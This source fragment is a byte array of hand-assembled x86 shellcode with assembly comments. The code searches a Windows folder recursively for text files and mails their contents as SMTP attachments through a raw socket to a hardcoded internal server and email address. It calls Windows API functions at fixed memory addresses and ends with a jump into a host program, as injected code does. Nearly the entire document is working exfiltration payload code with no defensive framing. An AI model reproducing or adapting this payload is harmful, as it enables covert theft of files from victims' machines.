,0x83,0xC4,0x08										//	add		esp, 8
													//	;sprintf(szFilePath, "%s%s",strPath, AllFile);
,0xBB,0xF0,0x06,0x00,0x00							//	mov		ebx, AllFile
,0x01,0xF3											//	add		ebx, esi
,0x53												//	push	ebx
,0x8B,0x45,0x08										//	mov		eax, [ebp+8]			
,0x50												//	push    eax							; strPath
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]					;$szFilePath
,0x50												//	push	eax	 
,0xE8,0xD4,0x00,0x00,0x00							//	call    $sprintf
,0x83,0xC4,0x0C										//	add		esp, 12
													//	;handle = (long)::FindFirstFile(szFilePath, &findData);
,0x8D,0x85,0xBC,0xFD,0xFF,0xFF						//	lea		eax, [ebp-140h-104h]		;$findData
,0x50												//	push    eax
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]				;$szFilePath
,0x50												//	push	eax	
,0xB8,0xF9,0xF9,0x82,0x7C							//	mov		eax, 7c82f9f9H
,0xFF,0xD0											//	call	eax
,0x89,0x85,0xB8,0xFD,0xFF,0xFF						//	mov		[ebp-104h-140h-4H],eax		;$handle 0x00148968
													//	;if(handle != 0xFFFFFFFF)
,0xBB,0xFF,0xFF,0xFF,0xFF							//	mov		ebx, 0FFFFFFFFH
,0x3B,0x9D,0xB8,0xFD,0xFF,0xFF						//	cmp		ebx, [ebp-104h-140h-4H]			;
,0x0F,0x84,0x9A,0x00,0x00,0x00						//	je		_searchfileend
													//_finddir_while:
,0x8B,0x85,0xBC,0xFD,0xFF,0xFF						//	mov		eax, [ebp-104h-140H]		;findData.dwFileAttributes 
,0x83,0xE0,0x10										//	and		eax, 00000010H
,0x74,0x55											//	je		_finddir_next
,0x8A,0xA5,0xE8,0xFD,0xFF,0xFF						//	mov		AH, [ebp-104h-114H]
,0xB0,0x2E											//	mov		AL, 2EH
,0x38,0xC4											//	cmp		AH,AL
,0x74,0x49											//	je		_finddir_next
													//	;memset(szFilePath, 0x00, MAX_PATH);
,0x68,0x04,0x01,0x00,0x00							//	push    104H	
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]
,0x50												//	push    eax
,0xE8,0xBB,0x00,0x00,0x00							//	call	$memset
,0x83,0xC4,0x08										//	add		esp, 8
													//	;sprintf(szFilePath, "%s\%s",strPath, findData.cFileName);
,0x8D,0x85,0xE8,0xFD,0xFF,0xFF						//	lea		eax, [ebp-104h-114H]			;$findData.cFileName
,0x50												//	push    eax		
,0x8B,0x45,0x08										//	mov		eax,[ebp+8]			
,0x50												//	push    eax							; strPath
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]					;$szFilePath
,0x50												//	push	eax	 
,0xE8,0x63,0x00,0x00,0x00							//	call    $sprintf
,0x83,0xC4,0x0C										//	add		esp, 12
    
    
,0x8B,0x45,0x10										//	mov		eax,[ebp+16]
,0x50												//	push	eax			;server
,0xBB,0x88,0x07,0x00,0x00							//	mov		ebx,szFilter
,0x01,0xF3											//	add		ebx, esi	
,0x53												//	push	ebx
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104h]	
,0x50												//	push	eax
,0xE8,0x38,0xFE,0xFF,0xFF							//	call	$searchfile
,0x83,0xC4,0x0C										//	add		esp, 12
													//_finddir_next:
,0x8D,0x85,0xBC,0xFD,0xFF,0xFF						//	lea		eax, [ebp-140h-104h]		;$findData
,0x50												//	push    eax
,0x8B,0x85,0xB8,0xFD,0xFF,0xFF						//	mov		eax, [ebp-104h-140h-4H]
,0x50												//	push    eax			;handle
,0xB8,0x51,0x4F,0x83,0x7C							//	mov		eax, 7c834f51H
,0xFF,0xD0											//	call    eax
,0x89,0x85,0xB4,0xFD,0xFF,0xFF						//	mov     [ebp-104h-140h-4H-4H], eax	;bRet
,0xB8,0x01,0x00,0x00,0x00							//	mov		eax, 1
,0x3B,0x85,0xB4,0xFD,0xFF,0xFF						//	cmp		eax, [ebp-104h-140h-4H-4H]
,0x0F,0x84,0x74,0xFF,0xFF,0xFF						//	je		_finddir_while
													//_finddir_close:
													//	;FindClose((HANDLE)handle);
,0x8B,0x85,0xE8,0xFD,0xFF,0xFF						//	mov		eax, [ebp-104h-114H]
,0x50												//	push	eax
,0xB8,0x9C,0xEE,0x80,0x7C							//	mov		eax, 7c80ee9cH
,0xFF,0xD0											//	call	eax	
													//_searchfileend:
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x81,0xC4,0x00,0x04,0x00,0x00						//	add     esp, 400H
,0x5D												//	pop		ebp
,0xC3												//	ret
													//$sprintf:
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp			
,0x83,0xEC,0x0C										//	sub		esp,0CH		
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0x7D,0xF4										//	lea		edi, [ebp-0CH]
,0xB9,0x03,0x00,0x00,0x00							//	mov		ecx, 3H	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd
													//
,0x8B,0x45,0x10										//	mov		eax,[ebp+16]	;strFilter
,0x50												//	push	eax
,0x8B,0x45,0x0C										//	mov		eax,[ebp+12]	;strPath
,0x50												//	push	eax
,0xBB,0xF7,0x06,0x00,0x00							//	mov		ebx, szData01
,0x01,0xF3											//	add		ebx, esi
,0x53												//	push	ebx				;"%s%s"
,0x8B,0x45,0x08										//	mov		eax,[ebp+8]		;szFilePath
,0x50												//	push	eax
													//	
,0xB8,0xB4,0x45,0x92,0x7C							//	mov		eax,7c9245b4H	
,0xFF,0xD0											//	call	eax				;sprintf(szFilePath, "%s\%s",strPath, strFilter);
,0x83,0xC4,0x10										//	add		esp, 16
													//
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x83,0xC4,0x0C										//	add		esp, 0CH
,0x5D												//	pop     ebp			
,0xC3												//	ret
													//$memset:
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp			
,0x83,0xEC,0x0C										//	sub		esp,0CH		
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0x7D,0xF4										//	lea		edi, [ebp-0CH]
,0xB9,0x03,0x00,0x00,0x00							//	mov		ecx, 3H	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd
													//
,0x8B,0x45,0x0C										//	mov		eax,[ebp+12]	;MAX_PATH
,0x50												//	push	eax
,0x6A,0x00											//	push	0
,0x8B,0x45,0x08										//	mov		eax,[ebp+8]		;szFilePath
,0x50												//	push	eax
,0xB8,0x35,0x24,0x90,0x7C							//	mov		eax,7c902435H	
,0xFF,0xD0											//	call	eax				;memset(szFilePath, 0x00, MAX_PATH);
,0x83,0xC4,0x0C										//	add		esp, 12
													//
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x83,0xC4,0x0C										//	add		esp, 0CH
,0x5D												//	pop     ebp			
,0xC3												//	ret
													//$sendfile:
,0x55												//	push	ebp			
,0x89,0xE5											//	mov		ebp,esp			
,0x81,0xEC,0x00,0x02,0x00,0x00						//	sub		esp,200H		
,0x53												//	push	ebx
,0x56												//	push	esi
,0x57												//	push	edi
,0x8D,0xBD,0x00,0xFE,0xFF,0xFF						//	lea		edi, [ebp-200H]
,0xB9,0x40,0x00,0x00,0x00							//	mov		ecx, 40H	
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0H				
,0xF3,0xAB											//	rep		stosd
													//
													//	;Sleep(1);
,0xB8,0x01,0x00,0x00,0x00							//	mov		eax, 1h
,0x50												//	push	eax
,0xB8,0x46,0x24,0x80,0x7C							//	mov		eax, 7c802446H
,0xFF,0xD0											//	call	eax				
													//	
													//	;sprintf(szBuffer, DATA_FILE2, strFileName);
,0x8B,0x45,0x08										//	mov		eax,[ebp+8]
,0x50												//	push	eax
,0xBB,0xFD,0x06,0x00,0x00							//	mov		ebx, szDataFile
,0x01,0xF3											//	add		ebx, esi
,0x53												//	push	ebx
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104H]
,0x50												//	push	eax
,0xB8,0xB4,0x45,0x92,0x7C							//	mov		eax, 7c9245b4H	
,0xFF,0xD0											//	call	eax
,0x83,0xC4,0x0C										//	add		esp, 12
													//
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104H]
,0x50												//	push	eax
,0xB8,0x45,0x26,0x90,0x7C							//	mov		eax,7c902645H
,0xFF,0xD0											//	call	eax
,0x83,0xC4,0x04										//	add		esp, 4
,0x89,0x85,0xF8,0xFE,0xFF,0xFF						//	mov		[ebp-104H-4H],eax
													//
,0x6A,0x00											//	push	0
,0x8B,0x85,0xF8,0xFE,0xFF,0xFF						//	mov		eax, [ebp-104H-4H]
,0x50												//	push	eax
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104H]
,0x50												//	push	eax
,0x8B,0x45,0x10										//	mov		eax,[ebp+16]
,0x50												//	push	eax		;server
,0xB8,0x27,0x4C,0xAB,0x71							//	mov		eax, 71ab4c27H
,0xFF,0xD0											//	call	eax					;send(server, szBuffer, strlen(szBuffer), 0);	
													//_sendvalue:
													//	;HANDLE handle = CreateFile(strFilePath, GENERIC_READ, FILE_SHARE_READ,NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
,0x6A,0x00											//	push	0
,0x68,0x80,0x00,0x00,0x00							//	push	00000080H
,0x6A,0x03											//	push	3
,0x6A,0x00											//	push	0
,0x6A,0x01											//	push	1
,0x68,0x00,0x00,0x00,0x80							//	push	80000000H
,0x8B,0x45,0x0C										//	mov		eax,[ebp+12]
,0x50												//	push	eax
,0xB8,0x28,0x1A,0x80,0x7C							//	mov		eax,7c801a28H
,0xFF,0xD0											//	call	eax
,0x89,0x85,0xF4,0xFE,0xFF,0xFF						//	mov		[ebp-104H-4H-4H], eax	;handle
													//	;if(handle != INVALID_HANDLE_VALUE)
,0xB8,0xFF,0xFF,0xFF,0xFF							//	mov		eax, 0FFFFFFFFH
,0x3B,0x85,0xF4,0xFE,0xFF,0xFF						//	cmp		eax, [ebp-104H-4H-4H]
,0x0F,0x84,0xA6,0x00,0x00,0x00						//	je		_sendfile_end
													//	
													//	;memset(szFilePath, 0x00, MAX_PATH);
,0x68,0x04,0x01,0x00,0x00							//	push    104H	
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]
,0x50												//	push    eax
,0xE8,0x0D,0xFF,0xFF,0xFF							//	call	$memset
,0x83,0xC4,0x08										//	add		esp, 8
													//	;DWORD nRead 
													//	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
,0x6A,0x00											//	push	0
,0x8D,0x85,0xF0,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104H-4H-4H-4H]	;nRead
,0x50												//	push	eax								
,0x68,0x04,0x01,0x00,0x00							//	push	104H						;MAX_PATH
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]			;szBuffer
,0x50												//	push    eax
,0x8B,0x85,0xF4,0xFE,0xFF,0xFF						//	mov		eax, [ebp-104H-4H-4H]
,0x50												//	push	eax							;handle
,0xB8,0x12,0x18,0x80,0x7C							//	mov		eax, 7c801812H
,0xFF,0xD0											//	call	eax
,0x89,0x85,0xEC,0xFE,0xFF,0xFF						//	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
													//_sendfile_while:
													//	;while(bRet && nRead > 0)
,0xB8,0x00,0x00,0x00,0x00							//	mov		eax, 0
,0x3B,0x85,0xEC,0xFE,0xFF,0xFF						//	cmp		eax, [ebp-104H-4H-4H-4H-4H]		;bRet
,0x74,0x4E											//	je		_closehandle
,0x3B,0x85,0xF0,0xFE,0xFF,0xFF						//	cmp		eax, [ebp-104H-4H-4H-4H]		;nRead
,0x73,0x46											//	JAE		_closehandle
													//
													//	;nRet = send(server, szBuffer, nRead, 0);
,0x6A,0x00											//	push	0
,0x8B,0x85,0xF0,0xFE,0xFF,0xFF						//	mov		eax,  [ebp-104H-4H-4H-4H]
,0x50												//	push	eax
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]
,0x50												//	push    eax
,0x8B,0x45,0x10										//	mov		eax, [ebp+16]
,0x50												//	push	eax		;server
,0xB8,0x27,0x4C,0xAB,0x71							//	mov		eax,71ab4c27H
,0xFF,0xD0											//	call	eax
													//	;BOOL bRet = ReadFile(handle, szBuffer, MAX_PATH, &nRead, NULL);
,0x6A,0x00											//	push	0
,0x8D,0x85,0xF0,0xFE,0xFF,0xFF						//	lea		eax, [ebp-104H-4H-4H-4H]
,0x50												//	push	eax			
,0x68,0x04,0x01,0x00,0x00							//	push	104H
,0x8D,0x85,0xFC,0xFE,0xFF,0xFF						//	lea		eax,  [ebp-104h]			;szBuffer
,0x50												//	push    eax	
,0x8B,0x85,0xF4,0xFE,0xFF,0xFF						//	mov		eax, [ebp-104H-4H-4H]		
,0x50												//	push	eax			;handle
,0xB8,0x12,0x18,0x80,0x7C							//	mov		eax,7c801812H
,0xFF,0xD0											//	call	eax					
,0x89,0x85,0xEC,0xFE,0xFF,0xFF						//	mov		[ebp-104H-4H-4H-4H-4H],eax	;bRet
,0xEB,0xA5											//	jmp		_sendfile_while
													//_closehandle:
,0x8B,0x85,0xF4,0xFE,0xFF,0xFF						//	mov		eax, [ebp-104H-4H-4H]
,0x50												//	push	eax			;handle
,0xB8,0xE7,0x9B,0x80,0x7C							//	mov		eax, 0x7c809be7
,0xFF,0xD0											//	call	eax
													//_sendfile_end:
,0x6A,0x00											//	push	0
,0x6A,0x02											//	push	2
,0xBB,0xF4,0x06,0x00,0x00							//	mov		ebx, szData3		
,0x01,0xF3											//	add 	ebx, esi
,0x53												//	push	ebx
,0x8B,0x45,0x10										//	mov		eax,[ebp+16]
,0x50												//	push	eax			;server
,0xB8,0x27,0x4C,0xAB,0x71							//	mov		eax, 71ab4c27H
,0xFF,0xD0											//	call	eax
,0x89,0x85,0xF8,0xFE,0xFF,0xFF						//	mov		[ebp-104H-4H],eax
													//	
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x81,0xC4,0x00,0x02,0x00,0x00						//	add		esp, 200H
,0x5D												//	pop     ebp			
,0xC3												//	ret
													//$_END:	
,0x5F												//	pop		edi
,0x5E												//	pop		esi
,0x5B												//	pop		ebx
,0x83,0xC4,0x0C										//	add		esp,0CH
,0x89,0xEC											//	mov		esp, ebp
,0x5D												//	pop     ebp	
,0xC3												//	ret

													//$sendExit: 	
,0x55												//	push	ebp			
,0x89,0xE5											// 	mov		ebp,esp			
,0x83,0xEC,0x0C										// 	sub		esp,0CH		
,0x53												// 	push	ebx
,0x56												// 	push	esi
,0x57												// 	push	edi
,0x8D,0x7D,0xF4										// 	lea		edi, [ebp-0CH]
,0xB9,0x03,0x00,0x00,0x00							// 	mov		ecx, 3H	
,0xB8,0x00,0x00,0x00,0x00							// 	mov		eax, 0H				
,0xF3,0xAB											// 	rep		stosd
            
,0x6A,0x00											// 	push	0
,0x6A,0x09											// 	push	09H
,0xBB,0xE6,0x06,0x00,0x00            				//  mov		ebx, szQuit
,0x01,0xF3                    						//  add		ebx, esi
,0x53												// 	push    ebx
,0x8B,0x45,0x08										// 	mov		eax, [ebp+8H]
,0x50												// 	push	eax
,0xB8,0x27,0x4C,0xAB,0x71							// 	mov		eax, 71ab4c27h
,0xFF,0xD0											// 	call	eax
,0x89,0x45,0xD4										// 	mov		[ebp-20h-8h-4h],eax		;nRet
,0xB8,0x09,0x00,0x00,0x00							// 	mov		eax, 09H
,0x39,0x45,0xD4										// 	cmp     [ebp-20h-8h-4h],eax	;	if(nRet == 06H)
,0x75,0x08											// 	jne     $closesocket
														// 
,0x5F												// 	pop		edi
,0x5E												// 	pop		esi
,0x5B												// 	pop		ebx
,0x83,0xC4,0x0C										// 	add		esp, 0CH
,0x5D												// 	pop     ebp			
,0xC3												// 	ret
													// $closesocket: 
,0x8B,0x45,0xE0										// 	mov		eax, [ebp-20h]
,0x50												// 	push	eax	
,0xB8,0x2B,0x3E,0xAB,0x71							// 	mov		eax, 0x71ab3e2b
,0xFF,0xD0											// 	call	eax
,0x89,0x45,0xD4										// 	mov		[ebp-20h-8h-4h],eax		;nRet
													// $WSACleanup: 
,0xB8,0xED,0x3F,0xAB,0x71							// 	mov		eax, 0x71ab3fed
,0xFF,0xD0											// 	call	eax
,0x89,0x45,0xD4										// 	mov		[ebp-20h-8h-4h],eax		;nRet
													// $end:
,0x5F												// 	pop		edi
,0x5E												// 	pop		esi
,0x5B												// 	pop		ebx
,0x81,0xC4,0x00,0x04,0x00,0x00						// 	add		esp,400H
,0x89,0xEC											// 	mov		esp, ebp
,0x5D												// 	pop     ebp	
,0xB8,0xA7,0x13,0x40,0x00              				//  mov		eax,00401f50H	;JMP 
,0xFF,0xE0                    						//  jmp		eax	
,0x48,0x45,0x4C,0x4F,0x20,0x31,0x30,0x2E,0x31		//  szPrepare	db		'HELO 10.10.1.9', 0DH, 0AH,	'AUTO LOGIN', 0DH, 0AH,	'MAIL FROM: <liujiquan@ase.com.cn>', 0DH, 0AH,	'RCPT TO: <liujiquan@ase.com.cn>', 0DH, 0AH,'DATA', 0DH, 0AH,'From: <liujiquan@ase.com.cn>', 0DH, 0AH,'To: <liujiquan@ase.com.cn>', 0DH, 0AH,'Date: 2014/09/26 11:16', 0DH, 0AH,'Subject:One Mail', 0DH, 0AH,'Mime-Version: 1.0', 0DH, 0AH,'Content-Type: multipart/mixed; boundary=\"INVT\"', 0DH, 0AH,0H
,0x30,0x2E,0x31,0x2E,0x39,0x0D,0x0A,0x41,0x55
,0x54,0x4F,0x20,0x4C,0x4F,0x47,0x49,0x4E,0x0D
,0x0A,0x4D,0x41,0x49,0x4C,0x20,0x46,0x52,0x4F
,0x4D,0x3A,0x20,0x3C,0x6C,0x69,0x75,0x6A,0x69
,0x71,0x75,0x61,0x6E,0x40,0x61,0x73,0x65,0x2E
,0x63,0x6F,0x6D,0x2E,0x63,0x6E,0x3E,0x0D,0x0A
,0x52,0x43,0x50,0x54,0x20,0x54,0x4F,0x3A,0x20
,0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61
,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D
,0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x44,0x41,0x54
,0x41,0x0D,0x0A,0x46,0x72,0x6F,0x6D,0x3A,0x20
,0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75,0x61
,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F,0x6D
,0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x54,0x6F,0x3A
,0x20,0x3C,0x6C,0x69,0x75,0x6A,0x69,0x71,0x75
,0x61,0x6E,0x40,0x61,0x73,0x65,0x2E,0x63,0x6F
,0x6D,0x2E,0x63,0x6E,0x3E,0x0D,0x0A,0x44,0x61
,0x74,0x65,0x3A,0x20,0x32,0x30,0x31,0x34,0x2F
,0x30,0x39,0x2F,0x32,0x36,0x20,0x31,0x31,0x3A
,0x31,0x36,0x0D,0x0A,0x53,0x75,0x62,0x6A,0x65
,0x63,0x74,0x3A,0x4F,0x6E,0x65,0x20,0x4D,0x61
,0x69,0x6C,0x0D,0x0A,0x4D,0x69,0x6D,0x65,0x2D
,0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x3A,0x20
,0x31,0x2E,0x30,0x0D,0x0A,0x43,0x6F,0x6E,0x74
,0x65,0x6E,0x74,0x2D,0x54,0x79,0x70,0x65,0x3A
,0x20,0x6D,0x75,0x6C,0x74,0x69,0x70,0x61,0x72
,0x74,0x2F,0x6D,0x69,0x78,0x65,0x64,0x3B,0x20
,0x62,0x6F,0x75,0x6E,0x64,0x61,0x72,0x79,0x3D
,0x22,0x49,0x4E,0x56,0x54,0x22,0x0D,0x0A,0x00
,0x2E,0x0D,0x0A,0x51,0x55,0x49,0x54,0x0D,0x0A		//	db		'.'	,0DH ,0AH,'QUIT',0DH ,0AH,0H
,0x00	
,0x2A,0x2E,0x2A,0x00								// AllFile		db		'*.*', 0H
,0x0D,0x0A,0x00										// szData3		db		'\r\n', 0H
,0x25,0x73,0x5C,0x25,0x73,0x00						// szData01		db		'%s\%s', 0H
,0x2D,0x2D,0x49,0x4E,0x56,0x54,0x0D,0x0A,0x43		// szDataFile	db 		'--INVT', 0DH, 0AH,'Content-type: application/octet-stream;', 0DH, 0AH,'Content-Transfer-Encoding: basp64;', 0DH, 0AH,'Content-Disposition: attachment;', 0DH, 0AH,'  filename="%s"', 0DH, 0AH, 0DH, 0A
,0x6F,0x6E,0x74,0x65,0x6E,0x74,0x2D,0x74,0x79
,0x70,0x65,0x3A,0x20,0x61,0x70,0x70,0x6C,0x69
,0x63,0x61,0x74,0x69,0x6F,0x6E,0x2F,0x6F,0x63
,0x74,0x65,0x74,0x2D,0x73,0x74,0x72,0x65,0x61
,0x6D,0x3B,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65
,0x6E,0x74,0x2D,0x54,0x72,0x61,0x6E,0x73,0x66
,0x65,0x72,0x2D,0x45,0x6E,0x63,0x6F,0x64,0x69
,0x6E,0x67,0x3A,0x20,0x62,0x61,0x73,0x70,0x36
,0x34,0x3B,0x0D,0x0A,0x43,0x6F,0x6E,0x74,0x65
,0x6E,0x74,0x2D,0x44,0x69,0x73,0x70,0x6F,0x73
,0x69,0x74,0x69,0x6F,0x6E,0x3A,0x20,0x61,0x74
,0x74,0x61,0x63,0x68,0x6D,0x65,0x6E,0x74,0x3B
,0x0D,0x0A,0x20,0x20,0x66,0x69,0x6C,0x65,0x6E
,0x61,0x6D,0x65,0x3D,0x22,0x25,0x73,0x22,0x0D
,0x0A,0x0D,0x0A,0x00  
,0x2A,0x2E,0x74,0x78,0x74,0x00						// szFilter		db		'*.txt', 0H
//,0x2A,0x2E,0x6A,0x70,0x67,0x00					// szFilter		db		'*.jpg', 0H
,0x43,0x3A,0x5C,0x57,0x6F,0x72,0x6B,0x5C,0x50		// szPath		db		'C:\Work\Pic', 0H
,0x69,0x63,0x00, 
};*/
{
	0x55,
0x89,0xE5,
0x81,0xEC,0x00,0x04,0x00,0x00,
0x53,
0x56,
0x57,
0x8D,0xBD,0x00,0xFC,0xFF,0xFF,
0xB9,0x80,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0xE8,0x0B,0x00,0x00,0x00,
0x77,0x73,0x32,0x5F,0x33,0x32,0x2E,0x64,0x6C,
0x6C,0x00,
0xB8,0x7B,0x1D,0x80,0x7C,
0xFF,0xD0,
0x8D,0x85,0x70,0xFE,0xFF,0xFF,
0x50,
0x68,0x02,0x02,0x00,0x00,
0xB8,0x55,0x6A,0xAB,0x71,
0xFF,0xD0,
0x85,0xC0,
0x0F,0x85,0x7A,0x05,0x00,0x00,
0xE8,0x88,0x05,0x00,0x00,
0x6A,0x00,
0x6A,0x01,
0x6A,0x02,
0xB8,0x11,0x42,0xAB,0x71,
0xFF,0xD0,
0x89,0x45,0xE0,
0xB8,0xFF,0x00,0x00,0x00,
0x39,0x45,0xE0,
0x75,0x07,
0x31,0xC0,
0xE9,0x4A,0x05,0x00,0x00,
0x66,0xB8,0x02,0x00,
0x66,0x89,0x45,0xD8,
0xB8,0x0A,0x0A,0x01,0x09,
0x89,0x45,0xDC,
0x66,0xB8,0x00,0x19,
0x66,0x89,0x45,0xDA,
0x6A,0x10,
0x8D,0x4D,0xD8,
0x51,
0x8B,0x45,0xE0,
0x50,
0xB8,0x07,0x4A,0xAB,0x71,
0xFF,0xD0,
0x89,0x45,0xD4,
0xB8,0x00,0x00,0x00,0x00,
0x39,0x45,0xD4,
0x0F,0x85,0x02,0x05,0x00,0x00,
0x8B,0x45,0xE0,
0x50,
0xE8,0x20,0x00,0x00,0x00,
0x83,0xC4,0x04,
0x8B,0x45,0xE0,
0x50,
0xE8,0x68,0x00,0x00,0x00,
0x83,0xC4,0x04,
0x8B,0x45,0xE0,
0x50,
0xE8,0x9D,0x04,0x00,0x00,
0x83,0xC4,0x04,
0xE9,0xD9,0x04,0x00,0x00,
0x55,
0x89,0xE5,
0x81,0xEC,0x00,0x02,0x00,0x00,
0x53,
0x56,
0x57,
0x8D,0xBD,0x00,0xFE,0xFF,0xFF,
0xB9,0x40,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0xBB,0x27,0x06,0x00,0x00,
0x01,0xF3,
0x53,
0xB8,0x45,0x26,0x90,0x7C,
0xFF,0xD0,
0x83,0xC4,0x04,
0x89,0x45,0xFC,
0xB8,0x00,0x00,0x00,0x00,
0x50,
0x8B,0x45,0xFC,
0x50,
0x53,
0x8B,0x45,0x08,
0x50,
0xB8,0x27,0x4C,0xAB,0x71,
0xFF,0xD0,
0x5F,
0x5E,
0x5B,
0x81,0xC4,0x00,0x02,0x00,0x00,
0x5D,
0xC3,
0x55,
0x89,0xE5,
0x83,0xEC,0x0C,
0x53,
0x56,
0x57,
0x8D,0x7D,0xF4,
0xB9,0x03,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0x8B,0x45,0x08,
0x50,
0xBB,0xD7,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0xBB,0xDD,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0xE8,0x08,0x00,0x00,0x00,
0x83,0xC4,0x0C,
0xE9,0xFE,0x03,0x00,0x00,
0x55,
0x89,0xE5,
0x81,0xEC,0x00,0x04,0x00,0x00,
0x53,
0x56,
0x57,
0x8D,0xBD,0x00,0xFE,0xFF,0xFF,
0xB9,0x80,0x00,0x00,0x00,
0xB8,0x00,0x00,0x00,0x00,
0xF3,0xAB,
0x8B,0x45,0x08,
0x8B,0x5D,0x0C,
0xB9,0x00,0x00,0x00,0x00,
0x39,0xC8,
0x0F,0x84,0xD4,0x01,0x00,0x00,
0x39,0xCB,
0x0F,0x84,0xCC,0x01,0x00,0x00,
0x8D,0x8D,0xFC,0xFE,0xFF,0xFF,
0x53,
0x50,
0x51,
0xE8,0xC9,0x01,0x00,0x00,
0x83,0xC4,0x0C,
0x8D,0x85,0xBC,0xFD,0xFF,0xFF,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xB8,0xF9,0xF9,0x82,0x7C,
0xFF,0xD0,
0x89,0x85,0xB8,0xFD,0xFF,0xFF,
0xBB,0xFF,0xFF,0xFF,0xFF,
0x3B,0x9D,0xB8,0xFD,0xFF,0xFF,
0x0F,0x84,0x8F,0x00,0x00,0x00,
0x8D,0x85,0xB4,0xFD,0xFF,0xFF,
0xB8,0x01,0x00,0x00,0x00,
0x89,0x85,0xB4,0xFD,0xFF,0xFF,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0xB6,0x01,0x00,0x00,
0x83,0xC4,0x08,
0x8D,0x85,0xE8,0xFD,0xFF,0xFF,
0x50,
0x8B,0x45,0x08,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0x5E,0x01,0x00,0x00,
0x83,0xC4,0x0C,
0x8B,0x45,0x10,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0x8D,0x85,0xE8,0xFD,0xFF,0xFF,
0x50,
0xE8,0xB6,0x01,0x00,0x00,
0x83,0xC4,0x0C,
0x8D,0x85,0xBC,0xFD,0xFF,0xFF,
0x50,
0x8B,0x85,0xB8,0xFD,0xFF,0xFF,
0x50,
0xB8,0x51,0x4F,0x83,0x7C,
0xFF,0xD0,
0x89,0x85,0xB4,0xFD,0xFF,0xFF,
0xB8,0x01,0x00,0x00,0x00,
0x3B,0x85,0xB4,0xFD,0xFF,0xFF,
0x74,0x90,
0x8B,0x85,0xE8,0xFD,0xFF,0xFF,
0x50,
0xB8,0x9C,0xEE,0x80,0x7C,
0xFF,0xD0,
0xB8,0x01,0x00,0x00,0x00,
0x89,0x85,0xB4,0xFD,0xFF,0xFF,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0x2D,0x01,0x00,0x00,
0x83,0xC4,0x08,
0xBB,0x3F,0x07,0x00,0x00,
0x01,0xF3,
0x53,
0x8B,0x45,0x08,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0xD4,0x00,0x00,0x00,
0x83,0xC4,0x0C,
0x8D,0x85,0xBC,0xFD,0xFF,0xFF,
0x50,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xB8,0xF9,0xF9,0x82,0x7C,
0xFF,0xD0,
0x89,0x85,0xB8,0xFD,0xFF,0xFF,
0xBB,0xFF,0xFF,0xFF,0xFF,
0x3B,0x9D,0xB8,0xFD,0xFF,0xFF,
0x0F,0x84,0x9A,0x00,0x00,0x00,
0x8B,0x85,0xBC,0xFD,0xFF,0xFF,
0x83,0xE0,0x10,
0x74,0x55,
0x8A,0xA5,0xE8,0xFD,0xFF,0xFF,
0xB0,0x2E,
0x38,0xC4,
0x74,0x49,
0x68,0x04,0x01,0x00,0x00,
0x8D,0x85,0xFC,0xFE,0xFF,0xFF,
0x50,
0xE8,0xBB,0x00,0x00,0x00,
0x83,0xC4,0x08,
